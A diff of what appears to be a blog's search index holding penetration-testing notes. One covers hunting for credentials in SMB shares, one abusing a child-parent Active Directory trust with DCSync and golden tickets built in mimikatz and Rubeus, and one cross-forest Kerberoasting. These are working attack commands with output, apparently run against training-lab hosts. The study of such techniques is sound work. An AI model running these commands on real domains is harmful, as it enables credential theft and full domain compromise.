@@ -203,40 +203,67 @@
       </tags>
   </entry>
   <entry>
-    <title>Credential Hunting in Network Shares</title>
-    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
-    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
-
-
+    <title>Attacking Child-Parent Trust From Windows</title>
+    <url>/2025/12/03/Attacking-Child-Parent-Trust-From-Windows/</url>
+    <content><![CDATA[<h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><blockquote>
+<p>To successfully get access to the parent domain we need first : </p>
 <ul>
-<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
-<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
+<li>The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).</li>
+<li>The SID of the child domain.</li>
+<li>The FQDN of the child domain.</li>
+<li>The name of a target user in the child domain (doesn’t need to exist!).</li>
+<li>The SID of the Enterprise Admins Group of the parent domain.</li>
 </ul>
-<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h3 id="Enumerate-Trust-Relationship"><a href="#Enumerate-Trust-Relationship" class="headerlink" title="Enumerate Trust Relationship"></a>Enumerate Trust Relationship</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+<p>➜ We have a <code>bidirectional Trust</code> between <code>Parent</code> and <code>Child</code> Domains.</p>
+<p>➜ We don’t have any SID Filter applied.</p>
+<h3 id="Enumerate-Account-Privs"><a href="#Enumerate-Account-Privs" class="headerlink" title="Enumerate Account Privs"></a>Enumerate Account Privs</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net user our<span class="literal">-privileged-user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Global <span class="built_in">Group</span> memberships     *Domain Users         *Domain Admins</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+<p>We are <em>Domain Admins</em> so we can DCSync and try ExtraSids Attack ( SID History Abuse)</p>
+<h1 id="Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain"><a href="#Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain" class="headerlink" title="Extract Sid, FQDN And krbtgt Hash Of The Child Domain"></a>Extract Sid, FQDN And krbtgt Hash Of The Child Domain</h1><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:NETBIOS_DOMAIN/krbtgt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line"></span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br></pre></td></tr></table></figure>
 
-<p>We can also download the files locally:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
 
-<p>Then search for the pattern we want:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
+<p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
+<p>SID : <code>S-1-5-21-2806153819-209893948-922872689</code>.</p>
+<p>krbtgt Hash : <code>9d765b482771505cbe97411065964d5f</code>.</p>
+<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><p>Get <code>child Domain</code> SID</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line">S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br></pre></td></tr></table></figure>
 
-<p>Example result</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
+<p>Get <code>Enterprise Admins</code> SID</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Domain</span> parent<span class="literal">-domain</span> <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> | <span class="built_in">select</span> distinguishedname,objectsid</span><br><span class="line"></span><br><span class="line">distinguishedname                                       objectsid</span><br><span class="line"><span class="literal">-----------------</span>                                       <span class="literal">---------</span></span><br><span class="line">CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Craft-A-Golden-Ticket"><a href="#Craft-A-Golden-Ticket" class="headerlink" title="Craft A Golden Ticket"></a>Craft A Golden Ticket</h1><blockquote>
+<p>➜ With this command, we craft a golden ticket for <code>non existing user ( twistzz )</code> and inject in the <code>SID History</code> attribute the SID of the <code>Enterprise Admins</code> Group.</p>
+</blockquote>
+<h3 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># kerberos::golden /user:twistzz /domain:child-domain-FQDN /sid:child-domain-SID /krbtgt:KRBTGT-hash /sids:Enterprise-Admins-SID /ptt</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  .\Rubeus.exe golden /rc4:KRBTGT<span class="literal">-hash</span> /domain:child<span class="literal">-domain-FQDN</span> /sid:child<span class="literal">-domain-SID</span>  /sids:Enterprise<span class="literal">-Admins-SID</span> /user:twistzz /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line">      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJ   &lt;SNIP&gt;   JFSUdIVC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Access-Files"><a href="#Access-Files" class="headerlink" title="Access Files"></a>Access Files</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; <span class="built_in">type</span> \\dc<span class="literal">-name</span>.parent<span class="literal">-domain</span>\c<span class="variable">$</span>\ExtraSids\script.txt</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="DCSync-Parent-Domain"><a href="#DCSync-Parent-Domain" class="headerlink" title="DCSync Parent Domain"></a>DCSync Parent Domain</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; netdom query /domain:parent<span class="literal">-domain</span> dc</span><br><span class="line">List of domain controllers with accounts <span class="keyword">in</span> the domain:</span><br><span class="line"></span><br><span class="line">dc<span class="literal">-name-of-parent-domain</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /dc:dc-name-of-parent-domain /domain:parent-domain /all /csv</span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>SMB</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>Domain Trusts</category>
+        <category>Abuse Child-Parent Trust From Windows</category>
       </categories>
       <tags>
-        <tag>SMB</tag>
-        <tag>Enumeration</tag>
+        <tag>PowerView</tag>
+        <tag>Mimikatz</tag>
+        <tag>Rubeus</tag>
       </tags>
   </entry>
   <entry>
@@ -303,66 +330,40 @@
       </tags>
   </entry>
   <entry>
-    <title>Attacking Child-Parent Trust From Windows</title>
-    <url>/2025/12/03/Attacking-Child-Parent-Trust-From-Windows/</url>
-    <content><![CDATA[<h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><blockquote>
-<p>To successfully get access to the parent domain we need first : </p>
-<ul>
-<li>The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).</li>
-<li>The SID of the child domain.</li>
-<li>The FQDN of the child domain.</li>
-<li>The name of a target user in the child domain (doesn’t need to exist!).</li>
-<li>The SID of the Enterprise Admins Group of the parent domain.</li>
-</ul>
+    <title>Cross-Forest : Kerberoasting</title>
+    <url>/2025/12/03/Cross-Forest-Kerberoasting/</url>
+    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><blockquote>
+<p>To do this, we need credentials for a user that can authenticate into the other domain and specify the <code>-target-domain</code> flag in our command.</p>
 </blockquote>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h3 id="Enumerate-Trust-Relationship"><a href="#Enumerate-Trust-Relationship" class="headerlink" title="Enumerate Trust Relationship"></a>Enumerate Trust Relationship</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure>
+<h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
+
+<h3 id="Request-TGS"><a href="#Request-TGS" class="headerlink" title="Request TGS"></a>Request TGS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -request -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
 
 
-<p>➜ We have a <code>bidirectional Trust</code> between <code>Parent</code> and <code>Child</code> Domains.</p>
-<p>➜ We don’t have any SID Filter applied.</p>
-<h3 id="Enumerate-Account-Privs"><a href="#Enumerate-Account-Privs" class="headerlink" title="Enumerate Account Privs"></a>Enumerate Account Privs</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net user our<span class="literal">-privileged-user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Global <span class="built_in">Group</span> memberships     *Domain Users         *Domain Admins</span><br></pre></td></tr></table></figure>
 
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain-1"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain-1" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Domain</span> &lt;CrossDomainName&gt; | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br></pre></td></tr></table></figure>
 
-<p>We are <em>Domain Admins</em> so we can DCSync and try ExtraSids Attack ( SID History Abuse)</p>
-<h1 id="Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain"><a href="#Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain" class="headerlink" title="Extract Sid, FQDN And krbtgt Hash Of The Child Domain"></a>Extract Sid, FQDN And krbtgt Hash Of The Child Domain</h1><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:NETBIOS_DOMAIN/krbtgt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line"></span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br></pre></td></tr></table></figure>
-
-
-<p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
-<p>SID : <code>S-1-5-21-2806153819-209893948-922872689</code>.</p>
-<p>krbtgt Hash : <code>9d765b482771505cbe97411065964d5f</code>.</p>
-<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><p>Get <code>child Domain</code> SID</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line">S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br></pre></td></tr></table></figure>
-
-<p>Get <code>Enterprise Admins</code> SID</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Domain</span> parent<span class="literal">-domain</span> <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> | <span class="built_in">select</span> distinguishedname,objectsid</span><br><span class="line"></span><br><span class="line">distinguishedname                                       objectsid</span><br><span class="line"><span class="literal">-----------------</span>                                       <span class="literal">---------</span></span><br><span class="line">CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Craft-A-Golden-Ticket"><a href="#Craft-A-Golden-Ticket" class="headerlink" title="Craft A Golden Ticket"></a>Craft A Golden Ticket</h1><blockquote>
-<p>➜ With this command, we craft a golden ticket for <code>non existing user ( twistzz )</code> and inject in the <code>SID History</code> attribute the SID of the <code>Enterprise Admins</code> Group.</p>
+<blockquote>
+<p>➜  We see that there is one account with an SPN in the target domain which is <code>mssqlsvc</code>.</p>
 </blockquote>
-<h3 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># kerberos::golden /user:twistzz /domain:child-domain-FQDN /sid:child-domain-SID /krbtgt:KRBTGT-hash /sids:Enterprise-Admins-SID /ptt</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  .\Rubeus.exe golden /rc4:KRBTGT<span class="literal">-hash</span> /domain:child<span class="literal">-domain-FQDN</span> /sid:child<span class="literal">-domain-SID</span>  /sids:Enterprise<span class="literal">-Admins-SID</span> /user:twistzz /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line">      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJ   &lt;SNIP&gt;   JFSUdIVC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Access-Files"><a href="#Access-Files" class="headerlink" title="Access Files"></a>Access Files</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; <span class="built_in">type</span> \\dc<span class="literal">-name</span>.parent<span class="literal">-domain</span>\c<span class="variable">$</span>\ExtraSids\script.txt</span><br></pre></td></tr></table></figure>
+<h3 id="Performing-a-Kerberoasting"><a href="#Performing-a-Kerberoasting" class="headerlink" title="Performing a Kerberoasting"></a>Performing a Kerberoasting</h3><blockquote>
+<p>➜ It’s the same as normal kerberoasting but in this case we add <code>/domain</code> and specify the target domain.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /domain:&lt;CrossDomainName&gt; /user:tar<span class="built_in">get-user</span> /nowrap</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="DCSync-Parent-Domain"><a href="#DCSync-Parent-Domain" class="headerlink" title="DCSync Parent Domain"></a>DCSync Parent Domain</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; netdom query /domain:parent<span class="literal">-domain</span> dc</span><br><span class="line">List of domain controllers with accounts <span class="keyword">in</span> the domain:</span><br><span class="line"></span><br><span class="line">dc<span class="literal">-name-of-parent-domain</span></span><br></pre></td></tr></table></figure>
 
 
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /dc:dc-name-of-parent-domain /domain:parent-domain /all /csv</span></span><br></pre></td></tr></table></figure>]]></content>
+]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
         <category>Exploitation</category>
-        <category>Domain Trusts</category>
-        <category>Abuse Child-Parent Trust From Windows</category>
+        <category>Cross Forest</category>
+        <category>Kerberoasting</category>
       </categories>
       <tags>
         <tag>PowerView</tag>
-        <tag>Mimikatz</tag>
         <tag>Rubeus</tag>
       </tags>
   </entry>
@@ -420,41 +421,40 @@
       </tags>
   </entry>
   <entry>
-    <title>Cross-Forest : Kerberoasting</title>
-    <url>/2025/12/03/Cross-Forest-Kerberoasting/</url>
-    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><blockquote>
-<p>To do this, we need credentials for a user that can authenticate into the other domain and specify the <code>-target-domain</code> flag in our command.</p>
-</blockquote>
-<h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
-
-<h3 id="Request-TGS"><a href="#Request-TGS" class="headerlink" title="Request TGS"></a>Request TGS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -request -target-domain &lt;CrossDomainName&gt; domain/our-user</span><br></pre></td></tr></table></figure>
+    <title>Credential Hunting in Network Shares</title>
+    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
+    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
 
 
-
-<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Enumerate-Users-With-SPN-On-The-Target-Domain-1"><a href="#Enumerate-Users-With-SPN-On-The-Target-Domain-1" class="headerlink" title="Enumerate Users With SPN On The Target Domain"></a>Enumerate Users With SPN On The Target Domain</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Domain</span> &lt;CrossDomainName&gt; | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜  We see that there is one account with an SPN in the target domain which is <code>mssqlsvc</code>.</p>
-</blockquote>
-<h3 id="Performing-a-Kerberoasting"><a href="#Performing-a-Kerberoasting" class="headerlink" title="Performing a Kerberoasting"></a>Performing a Kerberoasting</h3><blockquote>
-<p>➜ It’s the same as normal kerberoasting but in this case we add <code>/domain</code> and specify the target domain.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /domain:&lt;CrossDomainName&gt; /user:tar<span class="built_in">get-user</span> /nowrap</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
+<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
+</ul>
+<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
 
 
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span 